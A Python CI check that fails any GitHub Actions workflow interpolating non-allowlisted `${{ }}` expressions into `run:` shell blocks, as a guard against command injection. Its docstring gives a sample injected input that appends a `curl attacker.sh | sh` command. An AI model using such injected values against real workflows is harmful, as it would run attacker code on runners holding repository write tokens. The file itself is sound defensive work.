#!/usr/bin/env python3
"""Refuse a workflow that pastes an expression into a shell script.

GitHub expands ``${{ ... }}`` textually, before bash ever sees the script.
So a `run:` block containing ``${{ github.event.inputs.version }}`` is not
reading a variable, it is having the caller's text spliced into a command
line. A dispatch input of ``v1.0.0; curl attacker.sh | sh`` then runs on a
runner that, in the release workflow, is holding a token with write access to
this repository. The same is true of anything an outside contributor can set:
a branch name, a tag, a PR title, a commit message, an issue body.

The fix is always the same shape — bind the value to an `env:` entry and refer
to ``"$NAME"`` in the script — so this checks the shape rather than trying to
decide which values are dangerous. Expressions elsewhere in a workflow (a
`with:` input, an `if:`, an `env:` value) are passed as data and are fine;
only `run:` is a shell.

A small allowlist covers the expressions that cannot carry an injection
because GitHub, not a user, decides their value.
"""

from __future__ import annotations

import pathlib
import re
import sys

import yaml

WORKFLOWS = pathlib.Path(__file__).resolve().parent.parent / ".github" / "workflows"

EXPRESSION = re.compile(r"\$\{\{(.+?)\}\}", re.DOTALL)

#: Expressions whose value GitHub controls and which contain no user text.
#: `matrix.*` is included because the matrix is defined in the workflow file
#: itself, which is the thing being reviewed.
ALLOWED = re.compile(
    r"^\s*(env\.[A-Za-z_][A-Za-z0-9_]*"
    r"|matrix\.[A-Za-z_][A-Za-z0-9_]*"
    r"|runner\.[a-z_]+"
    r"|job\.status"
    r"|github\.(workspace|repository|repository_owner|run_id|run_number|"
    r"run_attempt|sha|job|action_path|event_name|api_url|server_url|"
    r"triggering_actor|actor_id|repository_id|repository_owner_id))\s*$"
)


def run_blocks(node: object, path: str = "") -> list[tuple[str, str]]:
    """Every `run:` script in a parsed workflow, with a path to point at."""
    found: list[tuple[str, str]] = []
    if isinstance(node, dict):
        for key, value in node.items():
            where = f"{path}.{key}" if path else str(key)
            if key == "run" and isinstance(value, str):
                found.append((where, value))
            else:
                found.extend(run_blocks(value, where))
    elif isinstance(node, list):
        for index, value in enumerate(node):
            found.extend(run_blocks(value, f"{path}[{index}]"))
    return found


def main() -> int:
    failures: list[str] = []
    workflows = sorted(WORKFLOWS.glob("*.y*ml"))
    if not workflows:
        print(f"No workflows found under {WORKFLOWS}")
        return 1

    for workflow in workflows:
        document = yaml.safe_load(workflow.read_text(encoding="utf-8"))
        for where, script in run_blocks(document):
            for match in EXPRESSION.finditer(script):
                if ALLOWED.match(match.group(1)):
                    continue
                failures.append(
                    f"{workflow.name}: {where} interpolates {match.group(0)} "
                    'into a shell script. Bind it to env: and read "$NAME".'
                )

    if failures:
        print("Expression interpolated into a run: block\n")
        for failure in failures:
            print(f"  {failure}")
        print(
            "\nGitHub expands ${{ }} before bash parses the line, so the value "
            "is spliced in as source, not passed as a string."
        )
        return 1

    print(f"{len(workflows)} workflows: no expression reaches a shell script")
    return 0


if __name__ == "__main__":
    sys.exit(main())
